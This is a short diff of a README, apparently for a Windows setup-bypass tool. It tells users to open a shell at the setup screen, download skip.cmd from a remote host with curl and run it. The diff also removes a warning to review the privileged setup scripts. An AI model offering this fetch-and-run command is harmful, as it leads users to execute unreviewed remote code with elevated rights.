@@ -30,6 +30,3 @@ At the Windows setup screen, press `Shift` + `F10`, then run:
 curl -fsSL bypass.dnslabs.tech -o skip.cmd
 call skip.cmd
 ```
-
-Before sharing the command, review every change to `scripts/setup.cmd` and `scripts/first-login.ps1`—they run with substantial permissions on a Windows PC.
-"# OOBE-Bypass" 
